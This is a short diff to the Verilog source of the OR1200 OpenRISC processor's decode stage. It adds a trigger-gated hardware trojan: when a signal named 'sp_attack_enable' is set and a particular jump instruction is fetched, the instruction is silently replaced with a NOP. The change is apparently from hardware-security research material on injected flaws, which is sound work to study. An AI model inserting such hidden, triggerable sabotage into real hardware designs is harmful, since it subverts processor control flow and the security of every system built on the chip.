@@ -543,6 +543,8 @@ always @(posedge clk or `OR1200_RST_EVENT rst) begin
 		id_insn <=  {`OR1200_OR32_NOP, 26'h041_0000};
         else if (id_flushpipe)
                 id_insn <=  {`OR1200_OR32_NOP, 26'h041_0000};        // NOP -> id_insn[16] must be 1
+	else if(sp_attack_enable[11] == 1'b1 && if_insn == {6'h0, 26'd13}) // Jump 13 insns later
+	        id_insn <= {8'h15, 8'h0, 16'h0}; // NOP
 	else if (!id_freeze) begin
 		id_insn <=  if_insn;
 `ifdef OR1200_VERBOSE
